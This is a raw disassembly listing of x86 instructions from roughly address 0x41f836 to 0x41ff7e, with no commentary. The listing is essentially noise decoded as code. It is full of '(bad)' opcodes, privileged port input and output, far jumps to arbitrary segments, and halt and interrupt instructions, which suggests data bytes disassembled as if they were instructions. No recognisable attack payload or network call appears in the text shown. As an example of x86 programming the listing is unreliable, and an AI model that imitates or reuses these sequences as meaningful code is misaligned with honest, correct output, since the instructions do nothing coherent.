  41f836:	mov    dl,BYTE PTR [ebx-0x76dbf335]
  41f83c:	(bad)  
  41f83d:	xor    BYTE PTR ds:0xd15c42be,bl
  41f843:	xchg   esi,eax
  41f844:	int3   
  41f845:	imul   esp,DWORD PTR [ebp+0x6b41f858],0xe49a1339
  41f84f:	push   es
  41f850:	jmp    0x41f877
  41f852:	js     0x41f8b5
  41f854:	or     eax,0x898b5e26
  41f859:	out    0xfa,al
  41f85b:	test   BYTE PTR [ebx+edx*1+0x69],0x22
  41f860:	scas   eax,DWORD PTR es:[edi]
  41f861:	test   DWORD PTR [ecx],ebx
  41f863:	in     al,0x99
  41f865:	pop    es
  41f866:	mov    edx,0x499944fa
  41f86b:	ins    BYTE PTR es:[edi],dx
  41f86c:	aad    0x0
  41f86e:	loop   0x41f835
  41f870:	mov    al,ds:0x4c527e8e
  41f875:	add    DWORD PTR [esi-0x6383fe74],ebx
  41f87b:	jbe    0x41f833
  41f87d:	scas   al,BYTE PTR es:[edi]
  41f87e:	fistp  DWORD PTR [edi-0x607fe1b8]
  41f884:	out    dx,al
  41f885:	mov    esp,0xbd22243c
  41f88a:	pop    esi
  41f88b:	adc    eax,0xc5de82dc
  41f890:	loop   0x41f8d0
  41f892:	pop    edx
  41f893:	scas   eax,DWORD PTR es:[edi]
  41f894:	push   0x5cee6d16
  41f899:	(bad)  
  41f89a:	dec    edx
  41f89b:	sbb    DWORD PTR ds:0xc57efcf7,ebp
  41f8a1:	stc    
  41f8a2:	pusha  
  41f8a3:	jg     0x41f903
  41f8a5:	jo     0x41f87a
  41f8a7:	pop    ecx
  41f8a8:	mov    ch,0x9b
  41f8ab:	mov    BYTE PTR [edi],bl
  41f8ad:	dec    eax
  41f8ae:	aaa    
  41f8af:	sbb    DWORD PTR [eax-0x4f681c93],ecx
  41f8b5:	xchg   BYTE PTR [eax-0x4c],bh
  41f8b8:	sub    dh,BYTE PTR [eax-0x7e]
  41f8bb:	jg     0x41f86a
  41f8bd:	rcl    DWORD PTR [eax+0x1990ab1],1
  41f8c3:	or     eax,0x4ff041a7
  41f8c8:	ds push ds
  41f8ca:	js     0x41f8e6
  41f8cc:	test   al,0x41
  41f8ce:	mov    esi,0xdda85952
  41f8d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f8d4:	xchg   ebp,eax
  41f8d5:	jae    0x41f8a6
  41f8d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f8d8:	xchg   edx,eax
  41f8d9:	out    dx,eax
  41f8da:	jle    0x41f919
  41f8dc:	loopne 0x41f928
  41f8de:	xor    al,0xdf
  41f8e0:	push   ebp
  41f8e1:	sub    al,0x37
  41f8e3:	jnp    0x41f8b1
  41f8e5:	dec    ebx
  41f8e6:	retf   0x40d7
  41f8e9:	jb     0x41f93d
  41f8eb:	fidivr DWORD PTR [ecx+0x52]
  41f8ee:	ins    DWORD PTR es:[edi],dx
  41f8ef:	adc    DWORD PTR [ebx],edi
  41f8f1:	add    al,BYTE PTR [edx]
  41f8f3:	sbb    eax,edi
  41f8f5:	or     ebx,esi
  41f8f7:	xor    bh,BYTE PTR [eax-0x3500d5ec]
  41f8fd:	xor    BYTE PTR [ebp-0x1a],dl
  41f900:	or     eax,0x508f4c3b
  41f905:	ja     0x41f8f4
  41f907:	mov    ebx,0xa418a777
  41f90c:	pop    ss
  41f90d:	cld    
  41f90e:	int3   
  41f90f:	imul   ebp,DWORD PTR [edi-0x6a],0xffffffa8
  41f913:	sub    eax,0xad008893
  41f918:	push   ebx
  41f919:	les    ebp,FWORD PTR [edi-0xf]
  41f91c:	add    eax,0x50dbcefd
  41f921:	dec    ebp
  41f922:	add    esi,DWORD PTR [edi]
  41f924:	or     BYTE PTR [eax+0x58620c02],0xd0
  41f92b:	and    al,0x42
  41f92d:	js     0x41f8be
  41f92f:	pop    es
  41f930:	jmp    0x41f946
  41f932:	pop    ss
  41f933:	rol    DWORD PTR ds:0xa1951633,0x8
  41f93a:	inc    edx
  41f93b:	push   esp
  41f93c:	dec    ebx
  41f93d:	jns    0x41f98a
  41f93f:	(bad)  
  41f940:	call   0xca6e1879
  41f945:	lock and al,ah
  41f948:	sti    
  41f949:	sahf   
  41f94a:	das    
  41f94b:	repz imul edx,DWORD PTR [ecx+0x340916b0],0xa632c3c2
  41f956:	sub    eax,0x7a3264ce
  41f95b:	xor    BYTE PTR [ebx+0x4afc02e3],al
  41f961:	out    dx,al
  41f962:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f963:	xchg   DWORD PTR [edx+esi*4+0x5f19b1d0],edx
  41f96a:	push   esi
  41f96b:	(bad)  
  41f96c:	stos   DWORD PTR es:[edi],eax
  41f96d:	(bad)
  41f972:	xor    edi,edx
  41f974:	inc    eax
  41f975:	je     0x41f9d7
  41f977:	dec    ebp
  41f978:	cmp    BYTE PTR [eax+0x11],cl
  41f97b:	push   0xffffffe5
  41f97d:	call   0xf0f67edc
  41f982:	pop    esp
  41f983:	dec    edx
  41f984:	sbb    BYTE PTR [edi+0x32f62b7e],0x76
  41f98b:	dec    eax
  41f98c:	aaa    
  41f98d:	add    BYTE PTR [eax+edi*8-0x3112a8e8],dl
  41f994:	into   
  41f995:	pusha  
  41f996:	ins    BYTE PTR es:[edi],dx
  41f997:	je     0x41f9a7
  41f999:	jno    0x41f9e5
  41f99b:	dec    esi
  41f99c:	test   BYTE PTR ds:[ebp+0x5a7e70c2],al
  41f9a3:	stos   DWORD PTR es:[edi],eax
  41f9a4:	push   0x268d36a
  41f9a9:	pop    ebx
  41f9aa:	call   0xb8a282b1
  41f9af:	mov    ecx,0x188db5d2
  41f9b4:	cli    
  41f9b5:	inc    ebx
  41f9b6:	jne    0x41f94e
  41f9b8:	push   ecx
  41f9b9:	das    
  41f9ba:	jae    0x41f985
  41f9bc:	sbb    DWORD PTR [esi],edx
  41f9be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f9bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f9c0:	mov    eax,0x940ac6d9
  41f9c5:	or     eax,0x418dde42
  41f9ca:	ins    BYTE PTR es:[edi],dx
  41f9cb:	mov    BYTE PTR [eax-0x619bcd38],dl
  41f9d1:	mov    ds:0x8cab603f,eax
  41f9d6:	sbb    dl,BYTE PTR [edi-0x12cc1ffd]
  41f9dc:	popf   
  41f9dd:	cdq    
  41f9de:	(bad)  
  41f9df:	pop    eax
  41f9e0:	xlat   BYTE PTR ds:[ebx]
  41f9e1:	scas   eax,DWORD PTR es:[edi]
  41f9e2:	not    BYTE PTR [edi+0x71]
	...
  41f9f0:	add    BYTE PTR [edi-0x637fe3d1],bh
  41f9f6:	mov    bl,0xbf
  41f9f8:	aas    
  41f9f9:	sysexit 
  41f9fb:	pop    ecx
  41f9fc:	push   ss
  41f9fd:	inc    esp
  41f9fe:	cmp    DWORD PTR [ecx],eax
  41fa00:	sbb    al,0x85
  41fa02:	je     0x41fa05
  41fa04:	add    BYTE PTR [ebx+eax*1-0x44af0000],ch
  41fa0b:	fwait
  41fa0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa0d:	scas   eax,DWORD PTR es:[edi]
  41fa0e:	in     eax,dx
  41fa0f:	cmc    
  41fa10:	loopne 0x41f9cf
  41fa12:	inc    eax
  41fa13:	cdq    
  41fa14:	ret    
  41fa15:	adc    eax,DWORD PTR [eax-0x1b]
  41fa18:	mov    BYTE PTR [ebp+0x53],al
  41fa1b:	fsubr  DWORD PTR [eax]
  41fa1d:	mov    WORD PTR [eax+0x72ebf835],ds
  41fa23:	cs and eax,0x49b306f
  41fa29:	inc    ecx
  41fa2a:	(bad)  
  41fa2b:	(bad)  
  41fa2c:	jo     0x41f9ec
  41fa2e:	clc    
  41fa2f:	add    DWORD PTR [edi],edx
  41fa31:	pusha  
  41fa32:	sar    bh,cl
  41fa34:	sbb    DWORD PTR [esi],edx
  41fa36:	(bad)  
  41fa37:	ror    DWORD PTR [eax-0x4f344eef],cl
  41fa3d:	mov    esi,0x26c3d65c
  41fa42:	leave  
  41fa43:	mov    ds:0x260b61f2,eax
  41fa48:	sbb    BYTE PTR [ecx],dh
  41fa4a:	pop    ebp
  41fa4b:	inc    edi
  41fa4c:	xchg   ecx,eax
  41fa4d:	mov    bl,0x6b
  41fa4f:	int3   
  41fa50:	cmp    ah,bl
  41fa52:	sub    al,0x87
  41fa54:	sbb    al,0x17
  41fa56:	(bad)  
  41fa57:	ss ja  0x41fa82
  41fa5a:	mov    edi,0x54abc269
  41fa5f:	dec    ecx
  41fa60:	ds es adc eax,0x3bcd6d4d
  41fa67:	fistp  QWORD PTR ds:0x3e470437
  41fa6d:	sar    esp,1
  41fa6f:	inc    ebx
  41fa70:	sub    ebp,0x79aaa9f2
  41fa76:	rcl    ch,1
  41fa78:	push   edx
  41fa79:	jmp    0xce153f40
  41fa7e:	out    0x4c,al
  41fa80:	test   DWORD PTR ds:[ecx],edx
  41fa83:	scas   al,BYTE PTR es:[edi]
  41fa84:	add    edx,DWORD PTR [esi-0x58]
  41fa87:	addr16 adc cl,dl
  41fa8a:	sub    DWORD PTR [edx+0x1406d03e],ebp
  41fa90:	jp     0x41fa47
  41fa92:	das    
  41fa93:	xchg   BYTE PTR [eax],bl
  41fa95:	jb     0x41fb09
  41fa97:	aam    0xf3
  41fa99:	in     eax,dx
  41fa9a:	or     al,0x22
  41fa9c:	sub    al,0x8c
  41fa9e:	jae    0x41fa9c
  41faa0:	or     al,0x9c
  41faa2:	add    esp,DWORD PTR [esi]
  41faa4:	scas   eax,DWORD PTR es:[edi]
  41faa5:	rcl    DWORD PTR [ecx+0x4666164d],cl
  41faab:	pusha  
  41faac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41faad:	jecxz  0x41fb1e
  41faaf:	mov    dl,0x66
  41fab1:	(bad)  
  41fab3:	mov    esi,0x6411248e
  41fab8:	pop    es
  41fab9:	(bad)  
  41fabc:	sub    DWORD PTR [edx],edi
  41fabe:	ret    
  41fabf:	xlat   BYTE PTR ds:[ebx]
  41fac0:	dec    edx
  41fac1:	or     DWORD PTR ds:0xd1094987,ebp
  41fac7:	(bad)  
  41fac8:	fld    TBYTE PTR [ecx]
  41faca:	xchg   ebp,eax
  41facb:	or     dh,al
  41facd:	shr    DWORD PTR [edi+0xb310d57],0x5c
  41fad4:	out    dx,al
  41fad5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fad6:	in     eax,0x21
  41fad8:	xchg   ecx,eax
  41fad9:	hlt    
  41fada:	daa    
  41fadb:	stos   BYTE PTR es:[edi],al
  41fadc:	adc    DWORD PTR ds:0x5cd38512,ecx
  41fae2:	out    0xfd,eax
  41fae4:	cmp    al,0x6a
  41fae6:	mov    BYTE PTR [edx],dl
  41fae8:	or     al,0x31
  41faea:	push   edx
  41faeb:	mov    bl,0x6
  41faed:	addr16 sbb al,0x14
  41faf0:	adc    DWORD PTR [esi],ecx
  41faf2:	idiv   BYTE PTR [esi-0x61]
  41faf5:	cdq    
  41faf6:	outs   dx,BYTE PTR ds:[esi]
  41faf7:	inc    edx
  41faf8:	stos   BYTE PTR es:[edi],al
  41faf9:	(bad)  
  41fafa:	sbb    eax,0xe0d9f922
  41faff:	daa    
  41fb00:	jg     0x41faf6
  41fb02:	xlat   BYTE PTR ds:[ebx]
  41fb03:	inc    esi
  41fb04:	popf   
  41fb05:	pop    es
  41fb06:	xor    al,0xde
  41fb08:	outs   dx,DWORD PTR ds:[esi]
  41fb09:	fsubr  st(5),st
  41fb0b:	repz mov bh,0xad
  41fb0e:	mov    edx,0x8d823769
  41fb13:	cmp    al,0xb7
  41fb15:	ret    
  41fb16:	dec    edi
  41fb17:	icebp  
  41fb18:	dec    esi
  41fb19:	mov    ecx,0xc8a66f2c
  41fb1e:	fwait
  41fb1f:	push   cs
  41fb20:	bound  esp,QWORD PTR [ecx+0x4b]
  41fb23:	inc    ecx
  41fb24:	push   0x79
  41fb26:	cs jns 0x41fb46
  41fb29:	enter  0x93db,0x1a
  41fb2d:	cmp    ebx,DWORD PTR [eax-0x2b]
  41fb30:	xor    al,0x24
  41fb32:	mov    ebx,0x632043e7
  41fb37:	and    bh,bl
  41fb39:	push   es
  41fb3a:	or     eax,0x741c4fc1
  41fb3f:	(bad)  
  41fb40:	scas   eax,DWORD PTR es:[edi]
  41fb41:	out    dx,eax
  41fb42:	jl     0x41fac6
  41fb44:	jne    0x41fb01
  41fb46:	out    dx,eax
  41fb47:	pop    ss
  41fb48:	xor    DWORD PTR [ecx+0x65],edx
  41fb4b:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  41fb4d:	mov    ebx,eax
  41fb4f:	imul   ebx,edi,0x71
  41fb52:	fs inc ebx
  41fb54:	and    bh,bh
  41fb56:	xchg   esp,eax
  41fb57:	jno    0x41fba3
  41fb59:	xlat   BYTE PTR ds:[ebx]
  41fb5a:	or     al,0x4d
  41fb5c:	pusha  
  41fb5d:	ss ror edi,0x93
  41fb61:	sbb    eax,0x3c1107aa
  41fb66:	fwait
  41fb67:	mov    dh,0x0
  41fb69:	and    ecx,DWORD PTR [eax]
  41fb6b:	mov    edx,0x33202f8f
  41fb70:	xchg   ebp,eax
  41fb71:	xor    esi,edi
  41fb73:	inc    eax
  41fb74:	loope  0x41fbdd
  41fb76:	iret   
  41fb77:	jmp    0x92e8:0x1538731c
  41fb7e:	lock sbb eax,0xcb4cdaff
  41fb84:	aad    0xba
  41fb86:	pushf  
  41fb87:	cmp    al,0xbf
  41fb89:	inc    ecx
  41fb8a:	fist   WORD PTR [edx+0x20]
  41fb8d:	or     DWORD PTR [ebp+ebx*8+0x175796b3],0xace147c0
  41fb98:	stos   DWORD PTR es:[edi],eax
  41fb99:	mov    eax,ds:0x34132020
  41fb9e:	dec    ebx
  41fb9f:	into   
  41fba0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fba1:	sbb    edi,DWORD PTR [ebp-0x73bb3d0c]
  41fba7:	cmp    al,0x95
  41fba9:	jne    0x41fb6a
  41fbab:	mov    eax,0x6e8044c5
  41fbb0:	cmc    
  41fbb1:	ret    0x2482
  41fbb4:	and    al,0x27
  41fbb6:	or     BYTE PTR [edx],bl
  41fbb8:	dec    esp
  41fbb9:	add    DWORD PTR [ebx+0x5b],esp
  41fbbc:	rcr    DWORD PTR [esi-0x37],1
  41fbbf:	push   ebx
  41fbc0:	icebp  
  41fbc1:	sbb    al,0xdb
  41fbc3:	call   0xaa45:0xcd9271d0
  41fbca:	clc    
  41fbcb:	pusha  
  41fbcc:	sub    eax,0x5414c979
  41fbd1:	call   0xe237:0xbbb29da4
  41fbd8:	inc    edx
  41fbd9:	adc    DWORD PTR [edi-0x3c],esp
  41fbdc:	cmp    ebx,DWORD PTR [edi-0x47494ef3]
  41fbe2:	push   0xffffffed
  41fbe4:	call   0x1abbd9ea
  41fbe9:	es jecxz 0x41fbf3
  41fbec:	ror    DWORD PTR [esi],0x53
  41fbef:	adc    BYTE PTR [edi+ebp*4],0x61
  41fbf3:	push   cs
  41fbf4:	outs   dx,DWORD PTR ds:[esi]
  41fbf5:	icebp  
  41fbf6:	mov    BYTE PTR [ecx-0x52295b32],ah
  41fbfc:	imul   ecx,edi,0x2
  41fbff:	adc    ebp,ebp
  41fc01:	mov    ch,0x73
  41fc03:	fs push esi
  41fc05:	(bad)  
  41fc06:	shl    BYTE PTR [edx+0x54],0x44
  41fc0a:	je     0x41fc01
  41fc0c:	sbb    al,BYTE PTR [eax]
  41fc0e:	fsubr  DWORD PTR [edi-0x2336a017]
  41fc14:	inc    esp
  41fc15:	into   
  41fc16:	adc    bl,BYTE PTR [ebx+0x21740046]
  41fc1c:	pop    ebx
  41fc1d:	sbb    esp,0x14479b6a
  41fc23:	jb     0x41fc9e
  41fc25:	dec    ebp
  41fc26:	mov    cl,0x8c
  41fc28:	aas    
  41fc29:	(bad)  
  41fc2a:	call   0xdfdeabb6
  41fc2f:	jmp    0x5348:0xc7e703d0
  41fc36:	push   ecx
  41fc37:	sub    BYTE PTR [ebp-0x760acb24],ah
  41fc3d:	mov    al,0xe1
  41fc3f:	in     eax,0xa6
  41fc41:	xchg   dl,dh
  41fc43:	inc    esi
  41fc44:	std    
  41fc45:	dec    edi
  41fc46:	mov    ds:0x23941874,al
  41fc4b:	sbb    edi,DWORD PTR [edi+0x396f021d]
  41fc51:	shl    BYTE PTR [edi],1
  41fc53:	into   
  41fc54:	mov    al,ds:0xfff9b16f
  41fc5a:	test   BYTE PTR [ecx],0x2b
  41fc5d:	xchg   esp,eax
  41fc5e:	inc    edi
  41fc5f:	jmp    0xe9d:0xcac58fe
  41fc66:	(bad)  
  41fc67:	fsubrp st(1),st
  41fc69:	fisub  DWORD PTR [ebp-0x374dcfe0]
  41fc6f:	out    0x4d,al
  41fc71:	push   ebx
  41fc72:	cmc    
  41fc73:	aas    
  41fc74:	js     0x41fc60
  41fc76:	int    0x7b
  41fc78:	jbe    0x41fcde
  41fc7a:	fldcw  WORD PTR [ebx+ebx*4]
  41fc7d:	les    esi,FWORD PTR [edi-0x6]
  41fc80:	mov    esp,0xdc4c1a12
  41fc85:	mov    DWORD PTR [ebx+esi*8],esi
  41fc88:	jns    0x41fca6
  41fc8a:	push   ss
  41fc8b:	ins    DWORD PTR es:[edi],dx
  41fc8c:	out    dx,eax
  41fc8d:	aam    0x7
  41fc8f:	jecxz  0x41fc1f
  41fc91:	pop    ds
  41fc92:	pop    ebx
  41fc93:	cmp    al,0x10
  41fc95:	pop    edi
  41fc96:	sub    edx,DWORD PTR [ebp+0x16]
  41fc99:	adc    DWORD PTR [ecx+0x49],0xffffffcd
  41fc9d:	adc    DWORD PTR [ebp+0x12],esp
  41fca0:	mov    eax,DWORD PTR [edx+0x68]
  41fca3:	xchg   edx,eax
  41fca4:	pop    es
  41fca5:	xor    edi,ecx
  41fca7:	jne    0x41fd14
  41fca9:	inc    ecx
  41fcaa:	push   0x9f91a9a7
  41fcaf:	stos   BYTE PTR es:[edi],al
  41fcb0:	add    BYTE PTR [edx-0x4879f1dc],bh
  41fcb6:	(bad)  
  41fcb7:	dec    edi
  41fcb8:	es into 
  41fcba:	pop    esi
  41fcbb:	xor    eax,ebp
  41fcbd:	scas   eax,DWORD PTR es:[edi]
  41fcbe:	inc    edx
  41fcbf:	les    edx,FWORD PTR [edi+0xf394345]
  41fcc5:	jmp    0xc228:0x7e6a2470
  41fccc:	push   esp
  41fccd:	(bad)  [esi]
  41fccf:	les    eax,FWORD PTR [edx]
  41fcd1:	xor    BYTE PTR [ebp+0x0],ah
  41fcd4:	loop   0x41fcc9
  41fcd6:	out    0x5d,al
  41fcd8:	xchg   ecx,eax
  41fcd9:	and    edi,ebp
  41fcdb:	mov    eax,0xae1fb891
  41fce0:	xlat   BYTE PTR ds:[ebx]
  41fce1:	sti    
  41fce2:	adc    BYTE PTR [esi+0x1],dl
  41fce5:	push   ebp
  41fce6:	pop    ds
  41fce7:	inc    edx
  41fce8:	pop    ecx
  41fce9:	cmp    BYTE PTR [esi],bh
  41fceb:	out    0x79,eax
  41fced:	addr16 xchg ebx,eax
  41fcef:	xor    esp,DWORD PTR [edi]
  41fcf1:	sbb    bl,al
  41fcf3:	dec    esi
  41fcf4:	cld    
  41fcf5:	xor    ah,BYTE PTR [eax]
  41fcf7:	xchg   ebx,eax
  41fcf8:	mov    edx,es
  41fcfa:	sbb    ecx,DWORD PTR [ebx]
  41fcfc:	lahf   
  41fcfd:	stc    
  41fcfe:	xor    eax,0x6cf57ab6
  41fd03:	outs   dx,BYTE PTR ds:[esi]
  41fd04:	dec    ecx
  41fd05:	add    DWORD PTR [ebp-0x4f],0xffffffd5
  41fd09:	test   DWORD PTR [eax],eax
  41fd0b:	mov    WORD PTR [ebp+0xbe2e0cf],gs
  41fd11:	sub    cl,BYTE PTR [ebp+eax*1-0x797c9551]
  41fd18:	outs   dx,BYTE PTR ds:[esi]
  41fd19:	repnz in eax,0xbe
  41fd1c:	jge    0x41fce1
  41fd1e:	push   ecx
  41fd1f:	and    BYTE PTR [esi],bh
  41fd21:	cmp    eax,0x8be1a069
  41fd26:	hlt    
  41fd27:	lock push ebx
  41fd29:	lea    eax,[ebx-0x57]
  41fd2c:	mov    ebp,0x57e2001e
  41fd31:	mov    bl,BYTE PTR [esi]
  41fd33:	mov    esp,0x83b17f29
  41fd38:	pop    ecx
  41fd39:	add    DWORD PTR [ecx+0x3c],eax
  41fd3c:	lahf   
  41fd3d:	sub    eax,0x2b1afcc7
  41fd42:	sar    DWORD PTR [edi-0x4e],cl
  41fd45:	rol    DWORD PTR [ebp+0x6f],1
  41fd48:	jl     0x41fd13
  41fd4a:	neg    esi
  41fd4c:	adc    al,0x22
  41fd4e:	ja     0x41fd01
  41fd50:	pop    eax
  41fd51:	and    al,0x66
  41fd53:	adc    BYTE PTR [eax],cl
  41fd55:	out    dx,al
  41fd56:	jl     0x41fd3d
  41fd58:	pop    ebx
  41fd59:	inc    esi
  41fd5a:	ss mov ebp,0xe7974ef4
  41fd60:	push   ebp
  41fd61:	icebp  
  41fd62:	cmp    eax,0x73a390c3
  41fd67:	cmc    
  41fd68:	xchg   esp,eax
  41fd69:	dec    esp
  41fd6a:	jbe    0x41fd11
  41fd6c:	lds    edx,FWORD PTR [edx-0x7d]
  41fd6f:	imul   edi,DWORD PTR [eax+ebp*4+0x5c],0xffffffdc
  41fd74:	lods   al,BYTE PTR ds:[esi]
  41fd75:	add    al,0xad
  41fd77:	scas   eax,DWORD PTR es:[edi]
  41fd78:	xchg   edi,eax
  41fd79:	repz fnsave [ecx+ebp*4+0x3d01a941]
  41fd81:	xchg   edi,eax
  41fd82:	xor    al,0xae
  41fd84:	pop    ecx
  41fd85:	popf   
  41fd86:	cmp    BYTE PTR [edx+0x1d],bh
  41fd89:	add    eax,DWORD PTR ds:0x1fe03cf6
  41fd8f:	mov    ecx,0x2e4b9803
  41fd94:	sbb    dh,BYTE PTR ds:0xd6b817a5
  41fd9a:	push   ebp
  41fd9b:	dec    ebx
  41fd9c:	enter  0xfe22,0xd3
  41fda0:	sbb    BYTE PTR [ecx],bl
  41fda2:	mov    al,BYTE PTR [ecx-0x1f]
  41fda5:	pushf  
  41fda6:	sti    
  41fda7:	jnp    0x41fd4b
  41fda9:	sar    BYTE PTR [ebp-0x38d99832],1
  41fdaf:	(bad)  
  41fdb0:	sub    bl,BYTE PTR [esi+0x58768d]
	...
  41fdbe:	add    BYTE PTR [eax],al
  41fdc0:	add    BYTE PTR [ecx-0x400c494c],cl
  41fdc6:	repz int 0xfe
  41fdc9:	push   ebp
  41fdca:	cmp    BYTE PTR [edx-0x7a],bl
  41fdcd:	cmp    al,0x36
  41fdcf:	xor    al,0xc6
  41fdd1:	xor    DWORD PTR [eax+0x1],edi
  41fdd4:	add    BYTE PTR [ebx+eax*1+0x20ac0000],ch
  41fddb:	test   eax,0xd6938755
  41fde0:	adc    eax,0x372efedb
  41fde5:	pop    eax
  41fde6:	cmp    ecx,ecx
  41fde8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fde9:	mov    esi,0xa3b8890d
  41fdee:	pop    ebp
  41fdef:	call   0x5dd46c72
  41fdf4:	jle    0x41fd88
  41fdf6:	(bad)  
  41fdf7:	xchg   ebx,eax
  41fdf8:	jne    0x41fe4c
  41fdfa:	fstp   TBYTE PTR [ebp+0x4b]
  41fdfd:	mov    WORD PTR [eax-0x37269120],es
  41fe03:	push   edi
  41fe04:	sub    al,0xe1
  41fe06:	pop    ecx
  41fe07:	wbinvd 
  41fe09:	xchg   esp,eax
  41fe0a:	out    0xe,eax
  41fe0c:	dec    edx
  41fe0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe0e:	mov    esp,DWORD PTR [edx-0x650e9ab8]
  41fe14:	ins    DWORD PTR es:[edi],dx
  41fe15:	shl    BYTE PTR [esi+ebp*8],0x6a
  41fe19:	sub    al,0x67
  41fe1b:	dec    ebp
  41fe1c:	jl     0x41fdea
  41fe1e:	enter  0xab3d,0x13
  41fe22:	pop    ebp
  41fe23:	in     eax,0xe7
  41fe25:	adc    cl,BYTE PTR [ecx-0x4d]
  41fe28:	pop    edi
  41fe29:	sbb    BYTE PTR [ebx],bl
  41fe2b:	xor    DWORD PTR [edi],ebp
  41fe2d:	push   ebx
  41fe2e:	cli    
  41fe2f:	sub    al,BYTE PTR [edi+ecx*4+0x24f59d07]
  41fe36:	pop    ss
  41fe37:	mov    ds,WORD PTR [eax-0x1a]
  41fe3a:	dec    edx
  41fe3b:	or     BYTE PTR [edx-0x28],bh
  41fe3e:	inc    esp
  41fe3f:	inc    esi
  41fe40:	add    al,0x35
  41fe42:	mov    ?,WORD PTR [eax-0x18]
  41fe45:	adc    al,0x48
  41fe47:	retf   0xab01
  41fe4a:	lods   eax,DWORD PTR ds:[esi]
  41fe4b:	pop    ds
  41fe4c:	mov    ch,0xaf
  41fe4e:	mov    esp,0xdf544d66
  41fe53:	sar    ebp,cl
  41fe55:	fdiv   QWORD PTR [ebx]
  41fe57:	and    eax,0x90335e1
  41fe5c:	es leave 
  41fe5e:	gs mov bl,0x8e
  41fe61:	dec    edi
  41fe62:	adc    eax,0xe39625b7
  41fe67:	call   0x8cef:0xc5d2295a
  41fe6e:	(bad)  
  41fe6f:	pop    esp
  41fe70:	sbb    esp,DWORD PTR [eax+0x6b8ae13c]
  41fe76:	(bad)  
  41fe77:	cmp    ch,ah
  41fe79:	loopne 0x41fe5b
  41fe7b:	in     eax,dx
  41fe7c:	sbb    bl,dh
  41fe7e:	sub    ch,BYTE PTR [esi+0x275aecbb]
  41fe84:	xor    edx,DWORD PTR [esi+0xc]
  41fe87:	in     eax,dx
  41fe88:	inc    ebx
  41fe89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe8a:	loop   0x41fee5
  41fe8c:	xchg   BYTE PTR [edi-0x6c99225e],ah
  41fe92:	add    DWORD PTR [ebp+0x2dce7f30],0x63
  41fe99:	xchg   esp,eax
  41fe9a:	push   esi
  41fe9b:	iret   
  41fe9c:	ja     0x41fe4a
  41fe9e:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  41fea0:	xor    ch,BYTE PTR [esi+eiz*4-0xc38f39b]
  41fea7:	mov    WORD PTR [ebx],?
  41fea9:	inc    ebx
  41feaa:	mov    al,ds:0x820a31b2
  41feaf:	dec    edx
  41feb0:	in     eax,0xc8
  41feb2:	gs xor esi,ebx
  41feb5:	mov    cs,WORD PTR [ebp-0x71]
  41feb8:	pop    ds
  41feb9:	repz sbb DWORD PTR [ebx+eiz*2],eax
  41febd:	mov    ah,0x83
  41febf:	sahf   
  41fec0:	arpl   WORD PTR [ebx],di
  41fec2:	sahf   
  41fec3:	push   ebx
  41fec4:	jmp    0xd70eea5d
  41fec9:	push   cs
  41feca:	test   eax,0xfb7988b5
  41fecf:	fdivr  DWORD PTR [esi]
  41fed1:	mov    dl,0xf3
  41fed3:	sub    eax,0x4eb8d628
  41fed8:	test   eax,0xa6666ef4
  41fedd:	or     DWORD PTR [eax-0x5e],edx
  41fee0:	dec    esi
  41fee1:	(bad)  
  41fee2:	xchg   ecx,eax
  41fee3:	xor    DWORD PTR gs:[edi],esp
  41fee6:	mov    BYTE PTR [esi-0x7d],al
  41fee9:	jmp    0xef0a6647
  41feee:	add    cl,BYTE PTR [ebx+0x46]
  41fef1:	dec    ebx
  41fef2:	or     BYTE PTR [esi+0x43c3abf3],al
  41fef8:	sti    
  41fef9:	aaa    
  41fefa:	pop    ds
  41fefb:	dec    edi
  41fefc:	iret   
  41fefd:	pop    ss
  41fefe:	in     eax,0x48
  41ff00:	das    
  41ff01:	daa    
  41ff02:	sbb    BYTE PTR [esi+0x1b],bl
  41ff05:	test   al,0x10
  41ff07:	mov    eax,0xeea75bd0
  41ff0c:	jmp    0x7e2a7a47
  41ff11:	out    dx,eax
  41ff12:	cmp    eax,0x118d6137
  41ff17:	leave  
  41ff18:	imul   eax,DWORD PTR [esi],0xedbc4a87
  41ff1e:	add    DWORD PTR [edi],edi
  41ff20:	repz clc 
  41ff22:	leave  
  41ff23:	jns    0x41ff9d
  41ff25:	mov    ah,0xaa
  41ff27:	push   eax
  41ff28:	mov    ecx,0x970d9758
  41ff2d:	jmp    DWORD PTR [eax-0x76b94170]
  41ff33:	fadd   st(7),st
  41ff35:	and    dh,dh
  41ff37:	fdiv   st(2),st
  41ff39:	test   eax,0x7b422aa4
  41ff3e:	jno    0x41ffa2
  41ff40:	(bad)  
  41ff41:	pushf  
  41ff42:	or     esp,DWORD PTR [edx+0x53be1b23]
  41ff48:	mov    ds:0x694cb7f6,al
  41ff4d:	test   BYTE PTR [esi],dl
  41ff4f:	unpckhps xmm3,xmm0
  41ff52:	dec    esi
  41ff53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff54:	shl    BYTE PTR [edx],0x22
  41ff57:	in     al,0x7c
  41ff59:	and    eax,0x4e806f47
  41ff5e:	test   BYTE PTR [ecx+0x47],bl
  41ff61:	aam    0x65
  41ff63:	in     eax,0x73
  41ff65:	sub    eax,0x1345b157
  41ff6a:	pop    eax
  41ff6b:	shr    BYTE PTR [edx],cl
  41ff6d:	inc    ebp
  41ff6e:	scas   al,BYTE PTR es:[edi]
  41ff6f:	xchg   ebp,eax
  41ff70:	jp     0x41ffef
  41ff72:	daa    
  41ff73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff74:	shl    DWORD PTR [edi],0x85
  41ff77:	mov    ah,0x7d
  41ff79:	mov    ebp,0xa90de1a4
  41ff7e:	cwde   
